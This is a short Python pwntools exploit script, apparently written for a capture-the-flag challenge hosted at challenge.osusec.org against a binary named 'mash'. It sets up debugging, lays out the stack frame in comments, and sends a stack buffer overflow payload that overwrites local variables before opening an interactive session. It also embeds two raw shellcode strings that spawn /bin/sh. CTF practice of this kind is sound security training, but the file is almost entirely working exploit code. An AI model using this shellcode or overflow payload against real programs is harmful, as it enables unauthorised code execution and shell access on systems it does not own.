#!/usr/bin/env python3

import os
import sys
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

# set your target binary name here
binary_name = './mash'
gdb_command = ''
shellcode_64_nonzero = 'jlX\x0f\x05H\x89\xc7H\x89\xc6jrX\x0f\x05H\xbb//bin/shH1\xc0PSH\x89\xe7H\x89\xc6H\x89\xc2j;X\x0f\x05'
shellcode_63_nonzero = 'j2X\x99\xcd\x80P[SYjGX\xcd\x80j\x0bXRhn/shh//biT[RY\xcd\x80'
 

# setup debug binary
debug_name = binary_name[:-1] + 'x'
if not os.path.exists(debug_name):
    os.system("cp %s %s" % (binary_name, debug_name))


is_debug = False
# run program
if '--debug' in sys.argv:
    is_debug = True

if is_debug:
    p = process(debug_name)
    gdb.attach(p)
    raw_input("Press ENTER to continue to execute the program...")
else:
    p = process(binary_name)
    p = remote("challenge.osusec.org", 31300)


## write your exploit here
print(p.recvline())
print(p.recvline())
print(p.recvline())

# [return address]       rbp + 0x04       
# [saved rbp     ]       rbp
# [cookie        ]       rbp - 0x08
# [match         ]       rbp - 0x10
# [current       ]       rbp - 0x18
# [buffer        ]       rbp - 0x30

buffer = b"aaaabbbb" * int((0x30 - 0x10) / 8) + p64(5) * 2
p.sendline(buffer)

print(p.recvline())
p.interactive()